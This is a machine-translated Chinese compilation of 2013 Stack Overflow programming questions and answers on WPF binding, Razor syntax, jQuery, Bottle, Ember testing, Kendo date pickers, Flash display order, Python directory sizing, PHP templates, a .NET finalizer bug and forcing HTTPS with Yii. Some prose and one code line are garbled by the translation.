我有一个 ComboBox，如下所示。为什么代码隐藏不总是触发？

XAML：

```
<ComboBox   Height="23"
                        Name="cbAppendCreate"
                        VerticalAlignment="Top"
                        Width="120"
                        Margin="{StaticResource ConsistentMargins}"
                        ItemsSource="{Binding Path=CbCreateAppendItems}"
                        SelectedValue="{Binding Path=CbAppendCreate,UpdateSourceTrigger=PropertyChanged}" /> 
```

代码隐藏：

```
private string cbAppendCreate;
public string CbAppendCreate {
    get {
        //....
        return cbAppendCreate
    }
    set { //This doesn't fire when selecting the first of 2 Items, 
          //but always fires when selecting the 2nd of two items 
          //....
         cbAppendCreate = value;
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T22:33:55.127

我将在这里发布我的工作代码，它非常简单。我刚刚使用 VS2012 模板创建了一个默认的 WPF 应用程序。这是 MainWindow.xaml 内容：

```
<Window x:Class="
    WpfApplication1.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="MainWindow" Height="350" Width="525">
<StackPanel>
    <ComboBox   Height="23"
                    Name="cbAppendCreate"
                    VerticalAlignment="Top"
                    Width="120"
                    ItemsSource="{Binding Path=CbCreateAppendItems}"
                    SelectedValue="{Binding Path=CbAppendCreate,UpdateSourceTrigger=PropertyChanged}" />
    <TextBlock Text="{Binding CbAppendCreate}"></TextBlock>
</StackPanel> 
```

这是代码隐藏：

```
namespace WpfApplication1
    {
    public class DataSource
    {
        public List<string> CbCreateAppendItems { get; set; }
        public string CbAppendCreate { get; set; }
        public DataSource()
        {
            CbCreateAppendItems = new List<string>() { "create", "append" };
        }
    }
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            DataContext = new DataSource();
        }
    }
} 
```

当我在组合框中选择不同的值时，TextBlock 会更新为相同的值，因此 VM 的属性也会更新。

# asp.net-mvc-4 - 管道字符导致 Html.BeginForm 中出现“意外令牌”错误

> ID：14903262
> 
> 赞同：1
> 
> 时间：2013-02-15T21:01:31.590
> 
> 标签：asp.net-mvc-4

我正在尝试重新创建现有登录表单的 HTML 设计以用于 MVC4 程序。这大部分都很好，但是当我尝试在两个元素之间输入管道字符（ | ）时，它会引发错误“意外标记”。您可以在底部、按钮之后和锚点之前看到它。任何想法为什么这是一个错误？有没有办法解决它？（除了删除管道字符？）

```
 @using (Html.BeginForm("Login", "AccountController", new { ReturnUrl = ViewBag.ReturnUrl }, FormMethod.Post, new { @class = "form-login form-wrapper form-narrow" }))
    { 
        @Html.AntiForgeryToken()
        @Html.ValidationSummary(true)

        <h3 class="title-divider"><span>Login</span> <small>Not signed up? @Html.ActionLink("Sign Up Here.", "Register")</small></h3>

        @Html.LabelFor(m => m.UserName)
        @Html.TextBoxFor(m => m.UserName, new { @class = "input-block-level" } )
        @Html.ValidationMessageFor(m => m.UserName)

        @Html.LabelFor(m => m.Password)
        @Html.PasswordFor(m => m.Password, new { @class = "input-block-level" })
        @Html.ValidationMessageFor(m => m.Password)

        @Html.LabelFor(m => m.RememberMe, new { @class = "checkbox" })
        @Html.CheckBoxFor(m => m.RememberMe)

        <button class="btn btn-primary" type="submit" value="Log in" >Sign in</button>
    | <a href="#">Forgotten Password?</a>
    } 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-15T21:03:26.033

将其放在`<text>`标签内或使用`@:`运算符

```
<text>|</text> 
```

或者

```
@:| 
```

在 using 语句中，您实际上是在一个剃刀代码块中，因此任何*不在*html 标记内或前面有 @: 运算符的内容都将被读取为服务器代码。

# javascript - 通过 var 引用调用 jQuery 函数

> ID：14903269
> 
> 赞同：0
> 
> 时间：2013-02-15T21:02:18.783
> 
> 标签：javascript, jquery, jquery-plugins

我正在尝试更改使用开关值调用的 jQuery 函数。在这种特殊情况下，它将抓取选择器，然后使用 'direction 的任何值来调用 jQuery 函数。

```
$('#'+the_name).value_of_switch(options.speed_up); 
```

我怎样才能做到这一点？

```
switch(direction){
    case 'up':   direction = 'slideDown';
    break;

    case 'down':  direction = 'slideUp';
    break;
}

$('#'+the_name).slideDown(options.speed_up); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T21:04:23.637

不太确定这是你的意思，这有帮助吗？

```
$('#'+the_name)["YOUR STRING VALUE HERE"](options.speed_up); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T22:04:17.210

$(文档).ready(函数(){

```
var direction = 'up'; 
var theName = $('#the_name');
  var options = {speed_up:'slow'};
switch(direction){
      case 'up':  
            direction = 'slideUp' ;
      break;

      case 'down': 
            direction = 'slideUp' ;
      break;
}

theName[direction](options.speed_up); 
```

});

[http://jsfiddle.net/VrPxd/32/](http://jsfiddle.net/VrPxd/32/)

# python - Python 瓶：返回 JSON 和 @route 相关属性

> ID：14903271
> 
> 赞同：0
> 
> 时间：2013-02-15T21:02:40.623
> 
> 标签：python, json, mod-wsgi, routes, bottle

我正在尝试使用 Python 瓶编写 WSGI 应用程序。我安装了瓶子，现在我将它与 Apache 的 mod_wsgi 模块一起运行，如下所述：[http ://code.google.com/p/modwsgi/wiki/QuickConfigurationGuide](http://code.google.com/p/modwsgi/wiki/QuickConfigurationGuide)

我想做的是根据 URL（请求）返回一个 JSON 文件。我设法做到了，但我认为这不是正确的方法，因为它充满了变通方法。我的意思是 [1](http://code.google.com/p/modwsgi/wiki/QuickConfigurationGuide)我不能返回 JSON 变量，因为 Apache 抱怨

```
RuntimeError: response has not been started 
```

[2](http://webpython.codepoint.net/wsgi_application_interface) mod_wsgi 要求我的可调用对象命名为“应用程序”并接受 2 个参数，这意味着我不能使用“@route”属性，如下所述：[http ://webpython.codepoint.net/wsgi_application_interface](http://webpython.codepoint.net/wsgi_application_interface)

因此，对于[1](http://code.google.com/p/modwsgi/wiki/QuickConfigurationGuide) ，我使用了 json.dumps 方法，对于[2](http://webpython.codepoint.net/wsgi_application_interface)，我将路由作为环境变量。您能否告诉我在这种情况下如何使用“@route”属性和 Python 瓶的最佳实践？我如何处理这两个问题如下所示：

```
#!/usr/bin/python

import  sys, os, time
import  json
import  MySQLdb
import  bottle
import  cgi

os.chdir( os.path.dirname( __file__ ) )
bottle.debug( True )
application = bottle.default_app( )

@bottle.route( '/wsgi/<parameter>' )
def     application( environ, start_response ) :

        # URL   = bottle.request.method
        URL = environ["PATH_INFO"]

        status                  = '200 OK'
        response_headers        = [('Content-type', 'application/json')]
        start_response( status, response_headers )

        demo    = { 'status':'online', 'servertime':time.time(), 'url':URL }
        demo    = json.dumps( demo )

        return  demo 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T09:27:30.553

正如评论所述，您应该编写一个像这样的瓶子应用程序（改编自您的代码）：

```
#!/usr/bin/python

import  sys, os, time
import  bottle

@bottle.route( '/wsgi/<parameter>' )
def application(parameter):
    return {'status':'online', 'servertime': time.time(), 'url': bottle.request.path}

if __name__ == '__main__':
    bottle.run(host="localhost", port=8080, debug=True) 
```

用 curl 测试：

```
$curl -i http://127.0.0.1:8080/wsgi/test
HTTP/1.0 200 OK
Date: Tue, 02 Apr 2013 09:25:18 GMT
Server: WSGIServer/0.1 Python/2.7.3
Content-Length: 73
Content-Type: application/json

{"status": "online", "url": "/wsgi/test", "servertime": 1364894718.82041} 
```

# javascript - 如何在 ember.js 中对视图进行单元测试？

> ID：14903273
> 
> 赞同：14
> 
> 时间：2013-02-15T21:02:52.057
> 
> 标签：javascript, unit-testing, model-view-controller, ember.js

我们正在学习 Ember.js。我们做所有的开发 TDD，并且希望 Ember.js 也不例外。我们有构建测试驱动的 Backbone.js 应用程序的经验，因此我们熟悉使用 Jasmine 或 Mocha/Chai 测试前端代码。

在弄清楚如何测试视图时，当视图使用的模板有`#linkTo`语句时，我们遇到了问题。不幸的是，我们无法找到好的测试示例和实践。这个要点是我们寻求如何体面地对 ember 应用程序进行单元测试的答案。

在查看[Ember.js 源代码中的 linkTo 测试时](https://github.com/emberjs/ember.js/blob/master/packages/ember/tests/helpers/link_to_test.js)，我们注意到它包含要支持的 ember 应用程序的完整连接`#linkTo`。这是否意味着我们在测试模板时不能存根这种行为？

如何使用模板渲染为 ember 视图创建测试？

这是我们的测试[的要点](https://gist.github.com/matthijsgroen/4760701)和使测试通过的模板，以及使测试失败的模板。

**view_spec.js.coffee**

```
# This test is made with Mocha / Chai,
# With the chai-jquery and chai-changes extensions

describe 'TodoItemsView', ->

  beforeEach ->
    testSerializer = DS.JSONSerializer.create
      primaryKey: -> 'id'

    TestAdapter = DS.Adapter.extend
      serializer: testSerializer
    TestStore = DS.Store.extend
      revision: 11
      adapter: TestAdapter.create()

    TodoItem = DS.Model.extend
      title: DS.attr('string')

    store = TestStore.create()
    @todoItem = store.createRecord TodoItem
      title: 'Do something'

    @controller = Em.ArrayController.create
      content: []

    @view = Em.View.create
      templateName: 'working_template'
      controller: @controller

    @controller.pushObject @todoItem

  afterEach ->
    @view.destroy()
    @controller.destroy()
    @todoItem.destroy()

  describe 'amount of todos', ->

    beforeEach ->
      # $('#konacha') is a div that gets cleaned between each test
      Em.run => @view.appendTo '#konacha'

    it 'is shown', ->
      $('#konacha .todos-count').should.have.text '1 things to do'

    it 'is livebound', ->
      expect(=> $('#konacha .todos-count').text()).to.change.from('1 things to do').to('2 things to do').when =>
        Em.run =>
          extraTodoItem = store.createRecord TodoItem,
            title: 'Moar todo'
          @controller.pushObject extraTodoItem 
```

**broken_template.handlebars**

```
<div class="todos-count"><span class="todos">{{length}}</span> things to do</div>

{{#linkTo "index"}}Home{{/linkTo}} 
```

**working_template.handlebars**

```
<div class="todos-count"><span class="todos">{{length}}</span> things to do</div> 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-17T03:43:22.963

我们的解决方案是从本质上加载整个应用程序，但尽可能隔离我们的测试对象。例如，

```
describe('FooView', function() {
  beforeEach(function() {
    this.foo = Ember.Object.create();
    this.subject = App.FooView.create({ foo: this.foo });
    this.subject.append();
  });

  afterEach(function() {
    this.subject && this.subject.remove();
  });

  it("renders the foo's favoriteFood", function() {
    this.foo.set('favoriteFood', 'ramen');
    Em.run.sync();
    expect( this.subject.$().text() ).toMatch( /ramen/ );
  });
}); 
```

也就是说，路由器和其他全局变量是可用的，所以它不是*完全*隔离的，但我们可以很容易地为更接近被测对象的东西发送双精度。

如果您真的想隔离路由器，`linkTo`助手将其查找为`controller.router`，所以您可以这样做

```
this.router = {
  generate: jasmine.createSpy(...)
};

this.subject = App.FooView.create({
  controller: { router: this.router },
  foo: this.foo
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-11-19T23:02:15.407

处理此问题的一种方法是为 linkTo 助手创建一个存根，然后在 before 块中使用它。这将绕过真正的 linkTo 的所有额外要求（例如路由），让您专注于视图的内容。这是我的做法：

```
// Test helpers
TEST.stubLinkToHelper = function() {
    if (!TEST.originalLinkToHelper) {
        TEST.originalLinkToHelper = Ember.Handlebars.helpers['link-to'];
    }
    Ember.Handlebars.helpers['link-to'] = function(route) {
        var options = [].slice.call(arguments, -1)[0];
        return Ember.Handlebars.helpers.view.call(this, Em.View.extend({
            tagName: 'a',
            attributeBindings: ['href'],
            href: route
        }), options);
    };
};

TEST.restoreLinkToHelper = function() {
    Ember.Handlebars.helpers['link-to'] = TEST.originalLinkToHelper;
    TEST.originalLinkToHelper = null;
};

// Foo test
describe('FooView', function() {
    before(function() {
        TEST.stubLinkToHelper();
    });

    after(function() {
        TEST.restoreLinkToHelper();
    });

    it('renders the favoriteFood', function() {
        var view = App.FooView.create({
            context: {
                foo: {
                    favoriteFood: 'ramen'
                }
            }
        });

        Em.run(function() {
            view.createElement();
        });

        expect(view.$().text()).to.contain('ramen');
    });
}); 
```

# knockout.js - Knockout-Kendo.js DatePicker / WebAPI / ISO 8601 日期绑定

> ID：14903280
> 
> 赞同：4
> 
> 时间：2013-02-15T21:03:09.983
> 
> 标签：knockout.js, asp.net-web-api, kendo-ui, iso8601

我在使用从 ASP.NET WebAPI 生成的 ISO 8601 格式并使用 Knockout-Kendo.js 绑定到 KendoUI DatePicker 小部件时遇到问题。

参考：

```
 http://cdn.kendostatic.com/2012.3.1315/styles/kendo.common.min.css
    http://cdn.kendostatic.com/2012.3.1315/styles/kendo.default.min.css 
    http://cdn.kendostatic.com/2012.3.1315/js/kendo.core.min.js
    http://cdn.kendostatic.com/2012.3.1315/js/kendo.web.min.js
    http://ajax.aspnetcdn.com/ajax/knockout/knockout-2.2.1.js
    http://rniemeyer.github.com/knockout-kendo/js/knockout-kendo.min.js 
```

html:

```
 <span data-bind="text: bigday"></span><br />
    <input data-bind="kendoDatePicker: bigday" /> 
```

Javascript：

```
 function ViewModel() {
        var self = this;
        self.bigday = ko.observable("2013-06-01T00:00:00"); 
        // ISO 8601 date as returned from ASP.NET WebAPI
    }

    ko.applyBindings(new ViewModel()); 
```

[http://jsfiddle.net/bschafer/NGLEp/](http://jsfiddle.net/bschafer/NGLEp/)

由于某种原因，该值没有绑定到 KendoDatePicker，但它绑定到了 span w/oa 问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T21:16:30.117

Kendo.UI DatePicker 使用[以下默认日期时间格式](http://docs.kendoui.com/api/web/datetimepicker#format-stringdefault)：`MM/dd/yyyy h:mm tt`

因此，您只需要使用以下`format`选项进行更改：

```
<input data-bind="kendoDatePicker: { value: bigday, format: 'yyyy-MM-dd' }" /> 
```

演示[JSFiddle](http://jsfiddle.net/ye865/)。

请注意，如果您想以一种格式解析日期但以不同的格式显示它们，也可以使用[parseFormats 。](http://docs.kendoui.com/api/web/datetimepicker#parseformats-array)

# actionscript-3 - 包含 .flv 前面的影片剪辑

> ID：14903281
> 
> 赞同：1
> 
> 时间：2013-02-15T21:03:11.883
> 
> 标签：actionscript-3, flash, flv, stagedisplaystate

我制作了一个 .swf 应用程序，它会自动进入具有以下功能的全屏模式

```
stage.displayState = StageDisplayState.FULL_SCREEN_INTERACTIVE;
stage.scaleMode = StageScaleMode.NO_SCALE; 
```

所以我想做的是开始一个 .flv 视频，在这个 .flv 包括前面，我想要一个 Movieclip，它在 .flv 视频前面。

在全屏模式下，这不起作用。如果我最小化windwow。影片剪辑位于包含 flv 的视频的前面。

所以我需要的是，在全屏模式下拥有类似 z-index 功能的东西。

有谁能够帮我

谢谢

闪存播放器：11.4

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T07:05:15.053

假设您有对每个显示对象的引用，您可以使用`swapChildren`交换深度或 z 索引：

```
var index1=this.getChildIndex(child1);

var index2=this.getChildIndex(child2);

this.swapChildren(index1,index2) 
```

其中 child1 & child2 可以是任何显示对象，包括视频播放器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-16T09:57:12.540

我制定了自己的解决方案：

```
var container:Sprite = new Sprite();

        container.addChild(logo);
        container.addChild(startVideo);

        container.swapChildren(logo, startVideo);

        this.addChild(container); 
```

有了这个 Sprite 对象，它就可以正常工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-16T07:20:45.650

我现在不在 Flash 面前，所以我无法测试这个问题，但我确信拥有一个在加载时自动全屏显示的应用程序被认为是不好的做法。Adobe 认为这是一种安全风险，他们可能采取了与您正在做的事情相冲突的安全措施……不过只是猜测。

> “这不起作用，在全屏模式下。如果我最小化窗口。Movieclip 位于包含 flv 的视频的前面。”

我的建议是在屏幕上的某处制作一个按钮，用于进入/退出全屏。因此，当它在窗口模式下看起来不错时，单击该按钮再次进入全屏模式，然后告诉我现在是否还可以，或者问题仍然存在？

A）如果没问题，那么您需要失去自动全屏功能，只需从舞台上的按钮开始。给它诸如“启动应用程序”之类的文本标签或类似的东西，这样用户就知道该做什么（比仅仅将它们全屏扔给一些意想不到的响亮视频等要好得多）。无论如何，在全屏时，您的函数应该在 flv 容器中添加子项MC，然后是你的另一个 MC。退出 FS 模式时使用 removeChild 命令。根据屏幕模式使“开始”按钮可见或隐藏（FS 隐藏，窗口可见等）。

B) 如果不行，你还有其他问题.. 我要睡觉了，但稍后会检查是否有回复。和平..

# python - 使用python（跨平台）快速计算大小并计算目录和子目录中的所有文件

> ID：14903287
> 
> 赞同：2
> 
> 时间：2013-02-15T21:03:23.417
> 
> 标签：python, file, operating-system

如何在计算 python 跨平台中的所有文件的同时快速计算大目录的大小，这是我当前的代码，但在大文件数（超过 100000）上非常慢：

```
class filecounter:
    def count(self, scandir):
            global filescount
            global totalsize
            if not scandir[-1] == '/' or '\\':
                    scandir = scandir + '/'
            try:
                    for item in os.listdir(scandir):
                            if os.path.isdir(scandir + item):
                                    filecounter().count(scandir + item)
                            else:
                                    totalsize = totalsize + os.path.getsize(scandir +item)
                                    filescount = filescount + 1
            except WindowsError, IOError:
                    pass 
```

需要全局

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T21:16:13.833

的[文档`os.walk`](http://docs.python.org/2/library/os.html)几乎与您要求的样本完全相同：

```
# from http://docs.python.org/2/library/os.html
import os
from os.path import join, getsize
for root, dirs, files in os.walk('python/Lib/email'):
    print root, "consumes",
    print sum(getsize(join(root, name)) for name in files),
    print "bytes in", len(files), "non-directory files"
    if 'CVS' in dirs:
        dirs.remove('CVS')  # don't visit CVS directories 
```

更改它以满足您的需求非常简单：

```
import os
from os.path import join, getsize
size = 0
count = 0
for root, dirs, files in os.walk('.'):
    size += sum(getsize(join(root, name)) for name in files)
    count += len(files)
print count, size 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-15T21:18:09.713

如果你想为文件导航编写可移植的代码，你应该考虑使用`os`模块中的函数和常量（`os.path.join`, `os.pathsep`, `os.altsep`, ...）。

优化代码的一种方法是使用`os.walk`函数删除递归和全局变量，但这不会给你带来太多好处。您将受到计算机 I/O 速度的限制。

```
def count(directory):
    totalsize = 0
    filecount = 0
    for dirpath, dirnames, filenames in os.walk(directory):
        for filename in filenames:
            try:
                totalsize += os.path.getsize(os.path.join(dirpath, filename))
                filecount += 1
            except OSError:
                pass
    return totalsize, filecount 
```

大部分时间将花在系统调用上以获取目录中的文件列表，并获取特定文件的大小。您可能可以使用 python 线程来并行化`os.stat`（间接调用`os.path.getsize`）的调用。这一次，python 线程将在执行系统调用时释放 GIL 时工作。

# php - 使用 php 在 html 中显示条件语句的最佳方法是什么？

> ID：14903294
> 
> 赞同：0
> 
> 时间：2013-02-15T21:04:00.143
> 
> 标签：php, html

使用 php 在 html 中显示条件语句的最佳方法是什么，一段时间以来我一直在使用以下内容：

```
<body>

    <?php if ($showDiv): ?>
    <div class='row'>
        <input type='text' name='input' />
    </div>  
    <?php endif ?>

    <?php if ($showDiv): ?>
    <div class='row'>
        <input type='text' name='input2' />
    </div>  
    <?php endif ?>

</body> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:09:17.997

你所做的事情本身并没有错。但是，您可以组合您的输出，因为您执行的测试是相同的（并假设这两个块之间没有其他内容）：

```
<body>

    <?php if ($showDiv): ?>
    <div class='row'>
        <input type='text' name='input' />
    </div>

    <div class='row'>
        <input type='text' name='input2' />
    </div>
    <?php endif; ?>

</body> 
```

`endif`不要忘记分句后的分号。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:10:50.913

正确的做法：

```
<body>

<?php if (isset($showDiv)){ ?>
<div class='row'>
    <input type='text' name='input' />
</div>  
<?php } ?>

<?php if (isset($showDiv)){ 

if ($showDiv == "show"){ ?>
<div class='row'>
    <input type='text' name='input2' />
</div>  
<?php } } ?>

</body> 
```

您应该检查您的值是否也不是空的；）

萨卢多斯。

# c# - MSTest 期间终结器中的 NullReferenceException

> ID：14903295
> 
> 赞同：20
> 
> 时间：2013-02-15T21:04:07.767
> 
> 标签：c#, .net, mstest, system.management

（我知道，这是一个非常长的问题。到目前为止，我试图将这个问题与我的调查分开，所以它更容易阅读。）

我正在使用 MSTest.exe 运行我的单元测试。有时，我会看到此测试错误：

关于单个单元测试方法：“在测试运行时代理进程已停止。”

在整个测试运行中：

```
后台线程之一引发异常：
System.NullReferenceException：对象引用未设置为对象的实例。
   在 System.Runtime.InteropServices.Marshal.ReleaseComObject（对象 o）
   在 System.Management.Instrumentation.MetaDataInfo.Dispose()
   在 System.Management.Instrumentation.MetaDataInfo.Finalize()

```

所以，这就是我认为我需要做的事情：我需要找出导致 MetaDataInfo 错误的原因，但我正在画一个空白。我的单元测试套件运行需要半个多小时，而且错误不是每次都发生，所以很难让它重现。

有没有其他人在运行单元测试时看到过这种类型的失败？您是否能够将其追踪到特定组件？

### 编辑：

被测代码混合了 C#、C++/CLI 和一些非托管 C++ 代码。非托管 C++ 仅在 C++/CLI 中使用，从不直接从单元测试中使用。单元测试都是 C#。

被测代码将在独立的 Windows 服务中运行，因此 ASP.net 或类似的东西没有任何复杂性。在被测代码中，有线程启动和停止、网络通信和本地硬盘驱动器的文件 I/O。

* * *

### 到目前为止我的调查：

我花了一些时间在我的 Windows 7 机器上挖掘 System.Management 程序集的多个版本，并在我的 Windows 目录中的 System.Management 中找到了 MetaDataInfo 类。（Program Files\Reference Assemblies 下的版本要小得多，并且没有 MetaDataInfo 类。）

使用 Reflector 检查这个程序集，我发现 MetaDataInfo.Dispose() 中似乎有一个明显的错误：

```
// From class System.Management.Instrumentation.MetaDataInfo:
public void Dispose()
{
    if (this.importInterface == null) // <---- Should be "!="
    {
        Marshal.ReleaseComObject(this.importInterface);
    }
    this.importInterface = null;
    GC.SuppressFinalize(this);
} 
```

向后使用此“if”语句，MetaDataInfo 将泄漏 COM 对象（如果存在），或者抛出 NullReferenceException（如果不存在）。我已经在 Microsoft Connect 上报告了这一点：[https ://connect.microsoft.com/VisualStudio/feedback/details/779328/](https://connect.microsoft.com/VisualStudio/feedback/details/779328/)

使用反射器，我能够找到 MetaDataInfo 类的所有用途。（它是一个内部类，所以只搜索程序集应该是一个完整的列表。）它只有一个地方使用：

```
public static Guid GetMvid(Assembly assembly)
{
    using (MetaDataInfo info = new MetaDataInfo(assembly))
    {
        return info.Mvid;
    }
} 
```

由于 MetaDataInfo 的所有使用都被正确处理，这就是正在发生的事情：

*   如果 MetaDataInfo.importInterface 不为空：
    *   静态方法 GetMvid 返回 MetaDataInfo.Mvid
    *   `using`调用 MetaDataInfo.Dispose
        *   Dispose 泄漏 COM 对象
        *   Dispose 将 importInterface 设置为 null
        *   Dispose 调用 GC.SuppressFinalize
    *   稍后，当 GC 收集 MetaDataInfo 时，会跳过终结器。
*   .
*   如果 MetaDataInfo.importInterface 为空：
    *   静态方法 GetMvid 获取调用 MetaDataInfo.Mvid 的 NullReferenceException。
    *   在异常向上传播之前，`using`调用 MetaDataInfo.Dispose
        *   Dispose 调用 Marshal.ReleaseComObject
            *   Marshal.ReleaseComObject 引发 NullReferenceException。
        *   因为抛出异常，Dispose 不会调用 GC.SuppressFinalize
    *   异常传播到 GetMvid 的调用者。
    *   稍后，当 GC 收集到 MetaDataInfo 时，它会运行 Finalizer
        *   完成调用 Dispose
            *   Dispose 调用 Marshal.ReleaseComObject
                *   Marshal.ReleaseComObject 抛出一个 NullReferenceException，它一直传播到 GC，应用程序被终止。

对于它的价值，这里是来自 MetaDataInfo 的其余相关代码：

```
public MetaDataInfo(string assemblyName)
{
    Guid riid = new Guid(((GuidAttribute) Attribute.GetCustomAttribute(typeof(IMetaDataImportInternalOnly), typeof(GuidAttribute), false)).Value);
    // The above line retrieves this Guid: "7DAC8207-D3AE-4c75-9B67-92801A497D44"
    IMetaDataDispenser o = (IMetaDataDispenser) new CorMetaDataDispenser();
    this.importInterface = (IMetaDataImportInternalOnly) o.OpenScope(assemblyName, 0, ref riid);
    Marshal.ReleaseComObject(o);
}

private void InitNameAndMvid()
{
    if (this.name == null)
    {
        uint num;
        StringBuilder szName = new StringBuilder {
            Capacity = 0
        };
        this.importInterface.GetScopeProps(szName, (uint) szName.Capacity, out num, out this.mvid);
        szName.Capacity = (int) num;
        this.importInterface.GetScopeProps(szName, (uint) szName.Capacity, out num, out this.mvid);
        this.name = szName.ToString();
    }
}

public Guid Mvid
{
    get
    {
        this.InitNameAndMvid();
        return this.mvid;
    }
} 
```

* * *

### 编辑2：

我能够在 Microsoft 的 MetaDataInfo 类中重现该错误。但是，我的复制与我在这里看到的问题略有不同。

*   复制：我尝试在不是托管程序集的文件上创建 MetaDataInfo 对象。`importInterface`这会在初始化之前从构造函数中引发异常。
*   我对 MSTest 的问题：MetaDataInfo 是在某个托管程序集上构造的，并且在初始化 之前发生了*一些*事情使`importInterface`null 或退出构造函数。`importInterface`
    *   我知道 MetaDataInfo 是在托管程序集上创建的，因为 MetaDataInfo 是一个内部类，并且唯一调用它的 API 是通过传递[Assembly.Location](http://msdn.microsoft.com/en-us/library/system.reflection.assembly.location.aspx)的结果来实现的。

但是，在 Visual Studio 中重新创建问题意味着它为我将源下载到 MetaDataInfo。这是实际代码，以及原始开发人员的评论。

```
public void Dispose()
{ 
    // We implement IDisposable on this class because the IMetaDataImport
    // can be an expensive object to keep in memory. 
    if(importInterface == null) 
        Marshal.ReleaseComObject(importInterface);
    importInterface = null; 
    GC.SuppressFinalize(this);
}

~MetaDataInfo() 
{
    Dispose(); 
} 
```

原始代码证实了在反射器中看到的内容：if 语句是向后的，它们不应该从终结器访问托管对象。

我之前说过，因为它从来没有调用`ReleaseComObject`，它正在泄漏 COM 对象。我阅读了更多关于 .Net 中使用 COM 对象的信息，如果我理解正确，那是不正确的：调用 Dispose() 时 COM 对象没有被释放，但是当垃圾收集器到达时它被释放收集运行时可调用包装器，它是一个托管对象。尽管它是一个非托管 COM 对象的包装器，但 RCW 仍然是一个托管对象，并且关于“不要从终结器访问托管对象”的规则仍然应该适用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-25T10:19:03.920

尝试将以下代码添加到您的类定义中：

```
bool _disposing = false  // class property

public void Dispose()
{
    if( !disposing ) 
        Marshal.ReleaseComObject(importInterface);
    importInterface = null; 
    GC.SuppressFinalize(this);

    disposing = true;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-22T20:30:35.807

如果 MetaDataInfo 使用 IDisposable 模式，那么还应该有一个终结器（C# 中的 ~MetaDataInfo()）。using 语句将确保调用 Dispose()，它将 importInterface 设置为 null。然后当 GC 准备完成时，调用 ~MetaDataInfo()，它通常会调用 Dispose（或者更确切地说，重载采用 bool disposing：Dispose(false)）。

我会说这个错误应该经常出现。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-23T00:10:33.007

您是否尝试为您的测试解决此问题？如果是这样，请重写您的使用。不要自己处理它，而是编写一些代码来使用反射来访问私有字段并正确处理它们，然后调用 GC.SuppressFinalize 以防止终结器运行。

作为一个简短的旁白（喜欢你的调查顺便说一句）你说 Dispose 调用 Finalize。反之亦然，当 GC 调用 Dispose 时，Finalize 被调用。

# php - 通过 htaccess 强制 https 登录用户

> ID：14903297
> 
> 赞同：3
> 
> 时间：2013-02-15T21:04:17.597
> 
> 标签：php, apache, .htaccess, https, yii

我正在尝试为所有登录用户强制使用 https。我的大多数应用程序都需要用户登录，但我仍然有许多页面应该只是 http，而其他页面应该通过 http（访客）和 https（登录用户）提供服务，具体取决于登录状态。

我正在使用 Yii 框架，并希望为登录用户的所有页面强制使用 https。用户通过模块进行控制。

这是我当前的 .htaccess

```
Options +FollowSymLinks

IndexIgnore */*

RewriteEngine on

RewriteCond %{HTTP_HOST} !^www\. [NC]
RewriteRule ^(.*)$ http://www.mysite.com/$1 [R=301,L]

#RedirectMatch 301 ^/tk/(.*)$ http://admin.mysite.com/$1
#RewriteRule ([a-z0-9-]+)/? http://$1.mysite.com [R=301,NC,L]

# if a directory or a file exists, use it directly

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d

# otherwise forward it to index.php

#RewriteRule . index.php
RewriteRule .* index.php [QSA,L] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T23:28:28.463

重写规则不是正确的解决方案：它占用了太多资源。

更好的使用：

```
RedirectPermanent / https://domain.tld 
```

如果可能的话，不要在`.htaccess`文件中，而是直接在 apache 配置中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:08:34.987

如果您使用会话或 cookie，则需要检查会话，如果它们有效，则将用户重定向到 https 站点。

这需要在 PHP 中完成。在纯 .htaccess 中无法做到这一点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-16T17:53:15.737

您可以使用过滤器来做到这一点。

[Yii CFilter 文档](http://www.yiiframework.com/doc/api/1.1/CFilter)

过滤器类示例：

```
class CHttpsCheckFilter extends CFilter {

protected function preFilter($filterChain) {
    //place your checking logic here.
    //$filterChain->controller is yor targer controller
    //other useful methods and fields you can find in official documentation.
    if ( !Yii::app()->getRequest()->isSecureConnection ) {            
        $url = 'https://your-new-path';
        Yii::app()->request->redirect($url);
        return false;
    } else
        return true;
}

protected function postFilter($filterChain) {
    return true;   
} 
```

然后，您需要通过`filters`在其中实现方法将此过滤器附加到您的控制器：

```
public function filters()
{
    return array(
        'accessControl', // perform access control for CRUD operations
        array(
            'CHttpsCheckFilter',
        ),
    );
} 
```

这是基本功能。您可以向过滤器添加额外的逻辑，它可以检查您的自定义方法的目标控制器是否有其他规则......或者它可能包含所有安全规则。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-15T23:24:04.933

如果您使用`session`为您的会话命名的 cookie，您可以使用 RewriteCond 来测试您的会话 cookie

```
RewriteCond %{HTTP_COOKIE} session
RewriteRule .* https://www.mysite.com/$0 [R,L] 
```

# php - 如何从 XML 文件中查找和获取属性

> ID：14903306
